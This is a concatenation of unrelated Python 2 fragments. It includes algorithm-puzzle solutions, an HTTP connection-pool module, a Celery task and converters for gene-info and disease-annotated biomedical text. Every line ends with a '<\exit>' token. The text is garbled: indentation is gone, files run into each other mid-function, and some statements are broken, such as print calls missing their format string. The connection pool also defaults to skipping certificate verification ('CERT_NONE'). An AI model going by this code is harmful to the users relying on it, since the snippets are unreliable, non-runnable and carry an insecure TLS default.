print >> sys.stderr, "Writing output to %s" % output_directory<\exit>
filenames = argv[3:]<\exit>
fail_count = 0<\exit>
for fn in filenames:<\exit>
try:<\exit>
process(fn)<\exit>
except Exception, e:<\exit>
m = unicode(e).encode(OUTPUT_ENCODING)<\exit>
print >> sys.stderr, "Error processing %s: %s" % (fn, m)<\exit>
fail_count += 1<\exit>
if fail_count > 0:<\exit>
print >> sys.stderr,  % (fail_count, len(filenames))<\exit>
return 0<\exit>
if __name__ == "__main__":<\exit>
sys.exit(main(sys.argv))<\exit>
class Solution(object):<\exit>
def __init__(self):<\exit>
self.max = -1<\exit>
self.cur_area = 0<\exit>
self.dirs = [(0, 1), (0, -1), (1, 0), (-1, 0), (1, 1), (1, -1), (-1, 1), (-1, -1)]<\exit>
def solve(self, cipher):<\exit>
m, n, mat = cipher<\exit>
visited = [[False for _ in xrange(n)] for _ in xrange(m)]<\exit>
for i in xrange(m):<\exit>
for j in xrange(n):<\exit>
if not visited[i][j] and mat[i][j] == 1:<\exit>
self.cur_area = 0<\exit>
self.dfs(visited, mat, i, j, m, n)<\exit>
return self.max<\exit>
def dfs(self, visited, mat, i, j, m, n):<\exit>
visited[i][j] = True<\exit>
self.cur_area += 1<\exit>
self.max = max(self.max, self.cur_area)<\exit>
for dir in self.dirs:<\exit>
i1 = i + dir[0]<\exit>
j1 = j + dir[1]<\exit>
if 0 <= i1 < m and 0 <= j1 < n and not visited[i1][j1] and mat[i1][j1] == 1:<\exit>
self.dfs(visited, mat, i1, j1, m, n)<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("0.in", "r")<\exit>
solution = Solution()<\exit>
m = int(f.readline().strip())<\exit>
n = int(f.readline().strip())<\exit>
mat = []<\exit>
for i in xrange(m):<\exit>
mat.append(map(int, f.readline().strip().split(' ')))<\exit>
cipher = m, n, mat<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
MOD = 1234567<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
return reduce(lambda x, y: x * y % MOD, cipher)<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
N = int(f.readline().strip())<\exit>
cipher = map(int, f.readline().strip().split(' '))<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
import logging<\exit>
import socket<\exit>
import errno<\exit>
from socket import error as SocketError, timeout as SocketTimeout<\exit>
try:<\exit>
from http.client import HTTPConnection, HTTPException<\exit>
from http.client import HTTP_PORT, HTTPS_PORT<\exit>
except ImportError:<\exit>
from httplib import HTTPConnection, HTTPException<\exit>
from httplib import HTTP_PORT, HTTPS_PORT<\exit>
try:<\exit>
from queue import LifoQueue, Empty, Full<\exit>
except ImportError:<\exit>
from Queue import LifoQueue, Empty, Full<\exit>
try:<\exit>
HTTPSConnection = object<\exit>
BaseSSLError = None<\exit>
ssl = None<\exit>
try:<\exit>
from http.client import HTTPSConnection<\exit>
except ImportError:<\exit>
from httplib import HTTPSConnection<\exit>
import ssl<\exit>
BaseSSLError = ssl.SSLError<\exit>
except (ImportError, AttributeError):<\exit>
pass<\exit>
from .request import RequestMethods<\exit>
from .response import HTTPResponse<\exit>
from .util import get_host, is_connection_dropped, ssl_wrap_socket<\exit>
from .exceptions import (<\exit>
ClosedPoolError,<\exit>
EmptyPoolError,<\exit>
HostChangedError,<\exit>
MaxRetryError,<\exit>
SSLError,<\exit>
TimeoutError,<\exit>
)<\exit>
from .packages.ssl_match_hostname import match_hostname, CertificateError<\exit>
from .packages import six<\exit>
xrange = six.moves.xrange<\exit>
log = logging.getLogger(__name__)<\exit>
_Default = object()<\exit>
port_by_scheme = {<\exit>
'http': HTTP_PORT,<\exit>
'https': HTTPS_PORT,<\exit>
}<\exit>
class VerifiedHTTPSConnection(HTTPSConnection):<\exit>
cert_reqs = None<\exit>
ca_certs = None<\exit>
ssl_version = None<\exit>
def set_cert(self, key_file=None, cert_file=None,<\exit>
cert_reqs='CERT_NONE', ca_certs=None):<\exit>
ssl_req_scheme = {<\exit>
'CERT_NONE': ssl.CERT_NONE,<\exit>
'CERT_OPTIONAL': ssl.CERT_OPTIONAL,<\exit>
'CERT_REQUIRED': ssl.CERT_REQUIRED<\exit>
}<\exit>
self.key_file = key_file<\exit>
self.cert_file = cert_file<\exit>
self.cert_reqs = ssl_req_scheme.get(cert_reqs) or ssl.CERT_NONE<\exit>
self.ca_certs = ca_certs<\exit>
def connect(self):<\exit>
sock = socket.create_connection((self.host, self.port), self.timeout)<\exit>
self.sock = ssl_wrap_socket(sock, self.key_file, self.cert_file,<\exit>
cert_reqs=self.cert_reqs,<\exit>
ca_certs=self.ca_certs,<\exit>
server_hostname=self.host,<\exit>
ssl_version=self.ssl_version)<\exit>
if self.ca_certs:<\exit>
match_hostname(self.sock.getpeercert(), self.host)<\exit>
class ConnectionPool(object):<\exit>
scheme = None<\exit>
QueueCls = LifoQueue<\exit>
def __init__(self, host, port=None):<\exit>
self.host = host<\exit>
self.port = port<\exit>
def __str__(self):<\exit>
return '%s(host=%r, port=%r)' % (type(self).__name__,<\exit>
self.host, self.port)<\exit>
class HTTPConnectionPool(ConnectionPool, RequestMethods):<\exit>
scheme = 'http'<\exit>
def __init__(self, host, port=None, strict=False, timeout=None, maxsize=1,<\exit>
block=False, headers=None):<\exit>
ConnectionPool.__init__(self, host, port)<\exit>
RequestMethods.__init__(self, headers)<\exit>
self.strict = strict<\exit>
self.timeout = timeout<\exit>
self.pool = self.QueueCls(maxsize)<\exit>
self.block = block<\exit>
for _ in xrange(maxsize):<\exit>
self.pool.put(None)<\exit>
self.num_connections = 0<\exit>
self.num_requests = 0<\exit>
def _new_conn(self):<\exit>
self.num_connections += 1<\exit>
log.info("Starting new HTTP connection (%d): %s" %<\exit>
(self.num_connections, self.host))<\exit>
return HTTPConnection(host=self.host,<\exit>
port=self.port,<\exit>
strict=self.strict)<\exit>
def _get_conn(self, timeout=None):<\exit>
conn = None<\exit>
try:<\exit>
conn = self.pool.get(block=self.block, timeout=timeout)<\exit>
except AttributeError:<\exit>
raise ClosedPoolError(self, "Pool is closed.")<\exit>
except Empty:<\exit>
if self.block:<\exit>
raise EmptyPoolError(self,<\exit>
"Pool reached maximum size and no more "<\exit>
"connections are allowed.")<\exit>
pass<\exit>
if conn and is_connection_dropped(conn):<\exit>
log.info("Resetting dropped connection: %s" % self.host)<\exit>
conn.close()<\exit>
return conn or self._new_conn()<\exit>
def _put_conn(self, conn):<\exit>
try:<\exit>
self.pool.put(conn, block=False)<\exit>
return<\exit>
except AttributeError:<\exit>
pass<\exit>
except Full:<\exit>
log.warning("HttpConnectionPool is full, discarding connection: %s"<\exit>
% self.host)<\exit>
conn.close()<\exit>
def _make_request(self, conn, method, url, timeout=_Default,<\exit>
**httplib_request_kw):<\exit>
self.num_requests += 1<\exit>
if timeout is _Default:<\exit>
timeout = self.timeout<\exit>
conn.timeout = timeout<\exit>
conn.request(method, url, **httplib_request_kw)<\exit>
sock = getattr(conn, 'sock', False)<\exit>
if sock:<\exit>
sock.settimeout(timeout)<\exit>
try:<\exit>
httplib_response = conn.getresponse(buffering=True)<\exit>
except TypeError:<\exit>
httplib_response = conn.getresponse()<\exit>
http_version = getattr(conn, '_http_vsn_str', 'HTTP/?')<\exit>
log.debug("\"%s %s %s\" %s %s" % (method, url, http_version,<\exit>
httplib_response.status,<\exit>
httplib_response.length))<\exit>
return httplib_response<\exit>
def close(self):<\exit>
old_pool, self.pool = self.pool, None<\exit>
try:<\exit>
while True:<\exit>
conn = old_pool.get(block=False)<\exit>
if conn:<\exit>
conn.close()<\exit>
except Empty:<\exit>
pass<\exit>
def is_same_host(self, url):<\exit>
if url.startswith('/'):<\exit>
return True<\exit>
scheme, host, port = get_host(url)<\exit>
if self.port and not port:<\exit>
port = port_by_scheme.get(scheme)<\exit>
return (scheme, host, port) == (self.scheme, self.host, self.port)<\exit>
def urlopen(self, method, url, body=None, headers=None, retries=3,<\exit>
redirect=True, assert_same_host=True, timeout=_Default,<\exit>
pool_timeout=None, release_conn=None, **response_kw):<\exit>
if headers is None:<\exit>
headers = self.headers<\exit>
if retries < 0:<\exit>
raise MaxRetryError(self, url)<\exit>
if timeout is _Default:<\exit>
timeout = self.timeout<\exit>
if release_conn is None:<\exit>
release_conn = response_kw.get('preload_content', True)<\exit>
if assert_same_host and not self.is_same_host(url):<\exit>
host = "%s://%s" % (self.scheme, self.host)<\exit>
if self.port:<\exit>
host = "%s:%d" % (host, self.port)<\exit>
raise HostChangedError(self, url, retries - 1)<\exit>
conn = None<\exit>
try:<\exit>
conn = self._get_conn(timeout=pool_timeout)<\exit>
httplib_response = self._make_request(conn, method, url,<\exit>
timeout=timeout,<\exit>
body=body, headers=headers)<\exit>
response_conn = not release_conn and conn<\exit>
response = HTTPResponse.from_httplib(httplib_response,<\exit>
pool=self,<\exit>
connection=response_conn,<\exit>
**response_kw)<\exit>
except Empty as e:<\exit>
raise TimeoutError(self, "Request timed out. (pool_timeout=%s)" %<\exit>
pool_timeout)<\exit>
except SocketTimeout as e:<\exit>
raise TimeoutError(self, "Request timed out. (timeout=%s)" %<\exit>
timeout)<\exit>
except BaseSSLError as e:<\exit>
raise SSLError(e)<\exit>
except CertificateError as e:<\exit>
raise SSLError(e)<\exit>
except (HTTPException, SocketError) as e:<\exit>
conn = None<\exit>
err = e<\exit>
if retries == 0:<\exit>
raise MaxRetryError(self, url, e)<\exit>
finally:<\exit>
if release_conn:<\exit>
self._put_conn(conn)<\exit>
if not conn:<\exit>
log.warn("Retrying (%d attempts remain) after connection "<\exit>
"broken by '%r': %s" % (retries, err, url))<\exit>
return self.urlopen(method, url, body, headers, retries - 1,<\exit>
redirect, assert_same_host,<\exit>
timeout=timeout, pool_timeout=pool_timeout,<\exit>
release_conn=release_conn, **response_kw)<\exit>
redirect_location = redirect and response.get_redirect_location()<\exit>
if redirect_location:<\exit>
if response.status == 303:<\exit>
method = 'GET'<\exit>
log.info("Redirecting %s -> %s" % (url, redirect_location))<\exit>
return self.urlopen(method, redirect_location, body, headers,<\exit>
retries - 1, redirect, assert_same_host,<\exit>
timeout=timeout, pool_timeout=pool_timeout,<\exit>
release_conn=release_conn, **response_kw)<\exit>
return response<\exit>
class HTTPSConnectionPool(HTTPConnectionPool):<\exit>
scheme = 'https'<\exit>
def __init__(self, host, port=None,<\exit>
strict=False, timeout=None, maxsize=1,<\exit>
block=False, headers=None,<\exit>
key_file=None, cert_file=None,<\exit>
cert_reqs='CERT_NONE', ca_certs=None, ssl_version=None):<\exit>
HTTPConnectionPool.__init__(self, host, port,<\exit>
strict, timeout, maxsize,<\exit>
block, headers)<\exit>
self.key_file = key_file<\exit>
self.cert_file = cert_file<\exit>
self.cert_reqs = cert_reqs<\exit>
self.ca_certs = ca_certs<\exit>
self.ssl_version = ssl_version<\exit>
def _new_conn(self):<\exit>
self.num_connections += 1<\exit>
log.info("Starting new HTTPS connection (%d): %s"<\exit>
% (self.num_connections, self.host))<\exit>
if not ssl:<\exit>
if not HTTPSConnection or HTTPSConnection is object:<\exit>
raise SSLError("Can't connect to HTTPS URL because the SSL "<\exit>
"module is not available.")<\exit>
return HTTPSConnection(host=self.host,<\exit>
port=self.port,<\exit>
strict=self.strict)<\exit>
connection = VerifiedHTTPSConnection(host=self.host,<\exit>
port=self.port,<\exit>
strict=self.strict)<\exit>
connection.set_cert(key_file=self.key_file, cert_file=self.cert_file,<\exit>
cert_reqs=self.cert_reqs, ca_certs=self.ca_certs)<\exit>
if self.ssl_version is None:<\exit>
connection.ssl_version = ssl.PROTOCOL_SSLv23<\exit>
else:<\exit>
connection.ssl_version = self.ssl_version<\exit>
return connection<\exit>
def connection_from_url(url, **kw):<\exit>
scheme, host, port = get_host(url)<\exit>
if scheme == 'https':<\exit>
return HTTPSConnectionPool(host, port=port, **kw)<\exit>
else:<\exit>
return HTTPConnectionPool(host, port=port, **kw)<\exit>
class Solution_TLE(object):<\exit>
def solve(self, cipher):<\exit>
n, k, a = cipher<\exit>
f = [0 for _ in xrange(n + 1)]<\exit>
for i in xrange(1, n + 1):<\exit>
f[i] = f[i - 1] + a[i - 1]<\exit>
result = 0<\exit>
for i in xrange(1, n + 1):<\exit>
for j in xrange(0, i):<\exit>
if (f[i] - f[j]) % k == 0:<\exit>
result += 1<\exit>
return result<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
n, k, a = cipher<\exit>
cnts = [0 for _ in xrange(k)]<\exit>
s = 0<\exit>
cnts[0] = 1<\exit>
for num in a:<\exit>
s += num<\exit>
s %= k<\exit>
cnts[s] += 1<\exit>
result = 0<\exit>
for cnt in cnts:<\exit>
result += (cnt * (cnt - 1)) / 2<\exit>
return result<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
solution = Solution()<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
n, k = map(int, f.readline().strip().split(' '))<\exit>
a = map(int, f.readline().strip().split(' '))<\exit>
cipher = n, k, a<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
_debug = 0<\exit>
eDetecting = 0<\exit>
eFoundIt = 1<\exit>
eNotMe = 2<\exit>
eStart = 0<\exit>
eError = 1<\exit>
eItsMe = 2<\exit>
SHORTCUT_THRESHOLD = 0.95<\exit>
import importlib<\exit>
import inspect<\exit>
import sys<\exit>
import os.path as op<\exit>
class Importer(object):<\exit>
@staticmethod<\exit>
def import_module(path):<\exit>
sys.path.append(op.dirname(path))<\exit>
file_name = op.splitext(op.basename(path))[0]<\exit>
return importlib.import_module(file_name)<\exit>
@staticmethod<\exit>
def inspect_module_classes(path):<\exit>
module = Importer.import_module(path)<\exit>
return [(name, module) for name, obj in inspect.getmembers(module)<\exit>
if inspect.isclass(obj)<\exit>
]<\exit>
from celery import Celery<\exit>
redis_url = 'redis://localhost:6379/0'<\exit>
app = Celery('overridden by celery command', broker=redis_url)<\exit>
@app.task<\exit>
def consume(a, b):<\exit>
print "consume a+b = %d" % (a + b)<\exit>
return a + b<\exit>
class Solution(object):<\exit>
def maxArea(self, H):<\exit>
maxa = 0<\exit>
s = 0<\exit>
e = len(H) - 1<\exit>
while s < e:<\exit>
maxa = max(maxa, min(H[s], H[e])*(e-s))<\exit>
if H[s] < H[e]:<\exit>
s += 1<\exit>
else:<\exit>
e -= 1<\exit>
return maxa<\exit>
from collections import namedtuple<\exit>
Sum = namedtuple("Sum", "sum i j")<\exit>
class Solution:<\exit>
def continuousSubarraySumII(self, A):<\exit>
if len(A) < 1:<\exit>
return [-1, -1]<\exit>
linear = self.linear_max_sum(A)<\exit>
circular = self.circular_max_sum(A)<\exit>
if linear.sum > circular.sum:<\exit>
return [linear.i, linear.j]<\exit>
return [circular.i, circular.j]<\exit>
def circular_max_sum(self, A):<\exit>
n = len(A)<\exit>
left = [None for _ in A]<\exit>
right = [None for _ in A]<\exit>
cur, max_sum, idx = 0, A[0], 0<\exit>
for i in xrange(n):<\exit>
cur += A[i]<\exit>
if cur > max_sum:<\exit>
idx = i<\exit>
max_sum = cur<\exit>
left[i] = (max_sum, idx)<\exit>
cur, max_sum, idx = 0, A[n-1], n-1<\exit>
for i in xrange(n-1, -1, -1):<\exit>
cur += A[i]<\exit>
if cur > max_sum:<\exit>
idx = i<\exit>
max_sum = cur<\exit>
right[i] = (max_sum, idx)<\exit>
ret = Sum(A[0], 0, 0)<\exit>
for i in xrange(1, n):<\exit>
r = right[i]<\exit>
l = left[i-1]<\exit>
if ret.sum < r[0]+l[0]:<\exit>
ret = Sum(r[0]+l[0], r[1], l[1])<\exit>
return ret<\exit>
def linear_max_sum(self, A):<\exit>
ret = Sum(A[0], 0, 0)<\exit>
cur = 0<\exit>
s = 0<\exit>
for e, v in enumerate(A):<\exit>
cur += v<\exit>
if ret.sum < cur:<\exit>
ret = Sum(cur, s, e)<\exit>
if cur < 0:<\exit>
s = e+1<\exit>
cur = 0<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().continuousSubarraySumII([3, 1, -100, -3, 4]) == [4, 1]<\exit>
assert Solution().continuousSubarraySumII([-5, 10, 5, -3, 1, 1, 1, -2, 3, -4]) == [1, 8]<\exit>
from collections import namedtuple<\exit>
Sum = namedtuple("Sum", "sum i j")<\exit>
class Solution:<\exit>
def continuousSubarraySum(self, A):<\exit>
if len(A) < 1:<\exit>
return [-1, -1]<\exit>
ret = Sum(A[0], 0, 0)<\exit>
cur = 0<\exit>
s = 0<\exit>
for e, v in enumerate(A):<\exit>
cur += v<\exit>
if ret.sum < cur:<\exit>
ret = Sum(cur, s, e)<\exit>
if cur < 0:<\exit>
s = e+1<\exit>
cur = 0<\exit>
return [ret.i, ret.j]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().continuousSubarraySum(<\exit>
[-101, -33, -44, -55, -67, -78, -101, -33, -44, -55, -67, -78, -100, -200, -1000, -22, -100, -200, -1000, -22]<\exit>
) == [15, 15]<\exit>
def fact(n):<\exit>
if n == 0:<\exit>
return 1<\exit>
else:<\exit>
return n * fact(n - 1)<\exit>
id = lambda x: x<\exit>
def factCPS(n):<\exit>
def f(n, k):<\exit>
if n == 0:<\exit>
return k(1)<\exit>
else:<\exit>
return f(n - 1, lambda x: k(n * x))<\exit>
return f(n, id)<\exit>
def factNoRec(n):<\exit>
def factory(n, k):<\exit>
return lambda x: k(n * x)<\exit>
k = id<\exit>
while True:<\exit>
if n == 0:<\exit>
return k(1)<\exit>
else:<\exit>
k = factory(n, k)<\exit>
n -= 1<\exit>
def factHolyCrap(n):<\exit>
k = ()<\exit>
while True:<\exit>
if n == 0:<\exit>
x = 1<\exit>
while k:<\exit>
x = k[0] * x<\exit>
k = k[1]<\exit>
return id(x)<\exit>
else:<\exit>
k = (n, k)<\exit>
n -= 1<\exit>
if __name__ == '__main__':<\exit>
print([f(5) for f in [fact, factCPS, factNoRec, factHolyCrap]])<\exit>
BASE = 2<\exit>
for i in range(2**3):<\exit>
weight = []<\exit>
for j in xrange(3):<\exit>
weight.append(i%(BASE))<\exit>
i /= BASE<\exit>
weight.reverse()<\exit>
print weight<\exit>
class Solution:<\exit>
def convertToPN(self, expression):<\exit>
return self.infix2prefix(expression)<\exit>
def infix2prefix(self, lst):<\exit>
stk = []<\exit>
pre = []<\exit>
for elt in reversed(lst):<\exit>
if elt.isdigit():<\exit>
pre.append(elt)<\exit>
elif elt == ")":<\exit>
stk.append(elt)<\exit>
elif elt == "(":<\exit>
while stk and stk[-1] != ")":<\exit>
pre.append(stk.pop())<\exit>
stk.pop()<\exit>
else:<\exit>
while stk and self.precedence(elt) < self.precedence(stk[-1]):<\exit>
pre.append(stk.pop())<\exit>
stk.append(elt)<\exit>
while stk:<\exit>
pre.append(stk.pop())<\exit>
pre.reverse()<\exit>
return pre<\exit>
def precedence(self, x):<\exit>
if x in ("(", ")"):<\exit>
return 0<\exit>
if x in ("+", "-"):<\exit>
return 1<\exit>
if x in ("*", "/"):<\exit>
return 2<\exit>
return 3<\exit>
if __name__ == "__main__":<\exit>
assert Solution().infix2prefix(["(", "5", "-", "6", ")", "*", "7"]) == ['*', '-', '5', '6', '7']<\exit>
class Solution(object):<\exit>
def convertToRPN(self, expression):<\exit>
return self.infix2postfix(expression)<\exit>
def infix2postfix(self, lst):<\exit>
stk = []<\exit>
ret = []<\exit>
for elt in lst:<\exit>
if elt.isdigit():<\exit>
ret.append(elt)<\exit>
elif elt == "(":<\exit>
stk.append(elt)<\exit>
elif elt == ")":<\exit>
while stk and stk[-1] != "(":<\exit>
ret.append(stk.pop())<\exit>
stk.pop()<\exit>
else:<\exit>
while stk and self.precedence(elt) <= self.precedence(stk[-1]):<\exit>
ret.append(stk.pop())<\exit>
stk.append(elt)<\exit>
while stk:<\exit>
ret.append(stk.pop())<\exit>
return ret<\exit>
def precedence(self, x):<\exit>
if x in ("(", ")"):<\exit>
return 0<\exit>
if x in ("+", "-"):<\exit>
return 1<\exit>
if x in ("*", "/"):<\exit>
return 2<\exit>
return 3<\exit>
if __name__ == "__main__":<\exit>
print Solution().infix2postfix(["3", "-", "4", "+", "5"])<\exit>
class Solution:<\exit>
def bitSwapRequired(self, a, b):<\exit>
a = self.to_bin(a)<\exit>
b = self.to_bin(b)<\exit>
diff = len(a)-len(b)<\exit>
ret = 0<\exit>
if diff<0:<\exit>
a, b = b, a<\exit>
diff *= -1<\exit>
b = "0"*diff+b<\exit>
for i in xrange(len(b)):<\exit>
if a[i]!=b[i]:<\exit>
ret += 1<\exit>
return ret<\exit>
def to_bin(self, n):<\exit>
a = abs(n)<\exit>
lst = []<\exit>
while a>0:<\exit>
lst.append(a%2)<\exit>
a /= 2<\exit>
if n>=0:<\exit>
lst.extend([0]*(32-len(lst)))<\exit>
else:<\exit>
pivot = -1<\exit>
for i in xrange(len(lst)):<\exit>
if pivot==-1 and lst[i]==1:<\exit>
pivot = i<\exit>
continue<\exit>
if pivot!=-1:<\exit>
lst[i] ^= 1<\exit>
lst.extend([1]*(32-len(lst)))<\exit>
return "".join(map(str, reversed(lst)))<\exit>
if __name__=="__main__":<\exit>
assert Solution().bitSwapRequired(1, -1)==31<\exit>
assert Solution().bitSwapRequired(31, 14)==2<\exit>
from __future__ import with_statement<\exit>
import sys<\exit>
import re<\exit>
import codecs<\exit>
INPUT_ENCODING = "UTF-8"<\exit>
TAX_ID_LABEL = 'Organism'<\exit>
GENE_ID_LABEL = 'Gene ID'<\exit>
SYMBOL_LABEL = 'Symbol'<\exit>
LOCUS_LABEL = 'Locus'<\exit>
SYNONYM_LABEL = 'Also known as'<\exit>
CHROMOSOME_LABEL = 'Chromosome'<\exit>
DESCRIPTION_LABEL = 'Description'<\exit>
GENE_TYPE_LABEL = 'Gene type'<\exit>
SYMBOL_AUTHORITY_LABEL = 'Official symbol'<\exit>
FULL_NAME_AUTHORITY_LABEL = 'Official full name'<\exit>
OTHER_DESIGNATION_LABEL = 'Name'<\exit>
OUTPUT_LABEL_ORDER = [<\exit>
SYMBOL_AUTHORITY_LABEL,<\exit>
SYMBOL_LABEL,<\exit>
FULL_NAME_AUTHORITY_LABEL,<\exit>
GENE_TYPE_LABEL,<\exit>
TAX_ID_LABEL,<\exit>
SYNONYM_LABEL,<\exit>
OTHER_DESIGNATION_LABEL,<\exit>
LOCUS_LABEL,<\exit>
CHROMOSOME_LABEL,<\exit>
DESCRIPTION_LABEL,<\exit>
]<\exit>
FILTER_LIST = [<\exit>
]<\exit>
def process_tax_id(val, record):<\exit>
assert re.match(r'^[0-9]+$', val)<\exit>
record.append(('info', TAX_ID_LABEL, val))<\exit>
def process_gene_id(val, record):<\exit>
assert re.match(r'^[0-9]+$', val)<\exit>
record.append(('key', GENE_ID_LABEL, val))<\exit>
def process_symbol(val, record):<\exit>
assert val != '-'<\exit>
for v in val.split('|'):<\exit>
assert re.match(r'^\S(?:.*\S)?$', v)<\exit>
record.append(('name', SYMBOL_LABEL, v))<\exit>
def process_locus(val, record):<\exit>
if val != '-':<\exit>
assert re.match(r'^[^\s|]+$', val)<\exit>
record.append(('name', LOCUS_LABEL, val))<\exit>
def process_synonyms(val, record):<\exit>
if val != '-':<\exit>
for v in val.split('|'):<\exit>
assert re.match(r'^\S(?:.*\S)?$', v)<\exit>
record.append(('name', SYNONYM_LABEL, v))<\exit>
def process_chromosome(val, record):<\exit>
if val != '-':<\exit>
assert re.match(r'^\S(?:.*\S)?$', val)<\exit>
record.append(('info', CHROMOSOME_LABEL, val))<\exit>
def process_description(val, record):<\exit>
if val != '-':<\exit>
record.append(('info', DESCRIPTION_LABEL, val))<\exit>
def process_gene_type(val, record):<\exit>
if val != '-':<\exit>
record.append(('info', GENE_TYPE_LABEL, val))<\exit>
def process_symbol_authority(val, record):<\exit>
if val != '-':<\exit>
record.append(('name', SYMBOL_AUTHORITY_LABEL, val))<\exit>
def process_full_name_authority(val, record):<\exit>
if val != '-':<\exit>
record.append(('name', FULL_NAME_AUTHORITY_LABEL, val))<\exit>
def process_other_designations(val, record):<\exit>
if val != '-':<\exit>
for v in val.split('|'):<\exit>
assert re.match(r'^\S(?:.*\S)?$', v)<\exit>
record.append(('name', OTHER_DESIGNATION_LABEL, v))<\exit>
field_processor = [<\exit>
process_tax_id,<\exit>
process_gene_id,<\exit>
process_symbol,<\exit>
process_locus,<\exit>
process_synonyms,<\exit>
None,<\exit>
process_chromosome,<\exit>
None,<\exit>
process_description,<\exit>
process_gene_type,<\exit>
process_symbol_authority,<\exit>
process_full_name_authority,<\exit>
None,<\exit>
process_other_designations,<\exit>
None,<\exit>
]<\exit>
output_priority = {}<\exit>
for i, l in enumerate(OUTPUT_LABEL_ORDER):<\exit>
output_priority[l] = output_priority.get(l, i)<\exit>
filter = set(FILTER_LIST)<\exit>
def process_line(l):<\exit>
fields = l.split('\t')<\exit>
assert len(fields) == 15<\exit>
record = []<\exit>
for i, f in enumerate(fields):<\exit>
if field_processor[i] is not None:<\exit>
try:<\exit>
field_processor[i](f, record)<\exit>
except:<\exit>
print >> sys.stderr, "Error processing field %d: '%s'" % (i+1,f)<\exit>
raise<\exit>
keys = [r for r in record if r[0] == 'key']<\exit>
assert len(keys) == 1<\exit>
key = keys[0]<\exit>
record = [r for r in record if r[0] != 'key']<\exit>
record.sort(lambda a, b: cmp(output_priority[a[1]],<\exit>
output_priority[b[1]]))<\exit>
filtered = []<\exit>
for r in record:<\exit>
if r not in filter:<\exit>
filtered.append(r)<\exit>
record = filtered<\exit>
seen = set()<\exit>
uniqued = []<\exit>
for r in record:<\exit>
if (r[0],r[2]) not in seen:<\exit>
seen.add((r[0],r[2]))<\exit>
uniqued.append(r)<\exit>
record = uniqued<\exit>
print '\t'.join([key[2]]+[':'.join(r) for r in record])<\exit>
def process(fn):<\exit>
with codecs.open(fn, encoding=INPUT_ENCODING) as f:<\exit>
for ln, l in enumerate(f):<\exit>
l = l.rstrip('\r\n')<\exit>
if l and l[0] == '#':<\exit>
continue<\exit>
try:<\exit>
process_line(l)<\exit>
except Exception, e:<\exit>
print >> sys.stderr, "Error processing line %d: %s" % (ln, l)<\exit>
raise<\exit>
def main(argv):<\exit>
if len(argv) < 2:<\exit>
print >> sys.stderr, "Usage:", argv[0], "GENE-INFO-FILE"<\exit>
return 1<\exit>
fn = argv[1]<\exit>
process(fn)<\exit>
if __name__ == "__main__":<\exit>
sys.exit(main(sys.argv))<\exit>
from __future__ import with_statement<\exit>
import sys<\exit>
import os<\exit>
import re<\exit>
import codecs<\exit>
INPUT_ENCODING = "UTF-8"<\exit>
OUTPUT_ENCODING = "UTF-8"<\exit>
ENTITY_TYPE = "Disease"<\exit>
ATTR_TYPE = "Category"<\exit>
FILE_PREFIX = "PMID-"<\exit>
output_directory = None<\exit>
def output(docid, text, anns):<\exit>
global output_directory<\exit>
if output_directory is None:<\exit>
txtout = sys.stdout<\exit>
soout = sys.stdout<\exit>
else:<\exit>
outfn = os.path.join(output_directory, FILE_PREFIX+docid)<\exit>
txtout = codecs.open(outfn+'.txt', 'wt', encoding=OUTPUT_ENCODING)<\exit>
soout = codecs.open(outfn+'.ann', 'wt', encoding=OUTPUT_ENCODING)<\exit>
txtout.write(text)<\exit>
idseq = 1<\exit>
for start, end, type_, text in anns:<\exit>
print >> soout, "T%d\t%s %d %d\t%s" % (idseq, ENTITY_TYPE, start, end,<\exit>
text)<\exit>
print >> soout, "A%d\t%s T%d %s" % (idseq, ATTR_TYPE, idseq, type_)<\exit>
idseq += 1<\exit>
if output_directory is not None:<\exit>
txtout.close()<\exit>
soout.close()<\exit>
def parse(s):<\exit>
text, anns = "", []<\exit>
s = re.sub(r'(<category[^<>]*>)( +)', r'\2\1', s)<\exit>
s = re.sub(r'( +)(<\/category>)', r'\2\1', s)<\exit>
rest = s.strip()<\exit>
while True:<\exit>
m = re.match(r'^(.*?)<category="([^"]+)">(.*?)</category>(.*)$', rest)<\exit>
if not m:<\exit>
break<\exit>
pre, type_, tagged, rest = m.groups()<\exit>
text += pre<\exit>
anns.append((len(text), len(text)+len(tagged), type_, tagged))<\exit>
text += tagged<\exit>
text += rest<\exit>
return text, anns<\exit>
def process(fn):<\exit>
docnum = 1<\exit>
sentences = []<\exit>
with codecs.open(fn, encoding=INPUT_ENCODING) as f:<\exit>
for l in f:<\exit>
l = l.strip('\n\r')<\exit>
try:<\exit>
PMID, title, body = l.split('\t', 2)<\exit>
except ValueError:<\exit>
assert False, "Expected three TAB-separated fields, got '%s'" %l<\exit>
body = body.replace('\t', ' ')<\exit>
t_text, t_anns = parse(title)<\exit>
b_text, b_anns = parse(body)<\exit>
t_text += '\n'<\exit>
b_text += '\n'<\exit>
text = t_text + b_text<\exit>
anns = t_anns + [(a[0]+len(t_text),a[1]+len(t_text),a[2],a[3])<\exit>
for a in b_anns]<\exit>
output(PMID, text, anns)<\exit>
def main(argv):<\exit>
global output_directory<\exit>
output_directory = None<\exit>
filenames = argv[1:]<\exit>
if len(argv) > 2 and argv[1] == "-o":<\exit>
output_directory = argv[2]<\exit>
print >> sys.stderr, "Writing output to %s" % output_directory<\exit>
filenames = argv[3:]<\exit>
fail_count = 0<\exit>
for fn in filenames:<\exit>
try:<\exit>
process(fn)<\exit>
except Exception, e:<\exit>
print >> sys.stderr, "Error processing %s: %s" % (fn, e)<\exit>
fail_count += 1<\exit>
if fail_count > 0:<\exit>
print >> sys.stderr,  % (fail_count, len(filenames))<\exit>
if __name__ == "__main__":<\exit>
sys.exit(main(sys.argv))<\exit>
from __future__ import with_statement<\exit>
import sys<\exit>
import re<\exit>
import codecs<\exit>
INPUT_ENCODING = "UTF-8"<\exit>
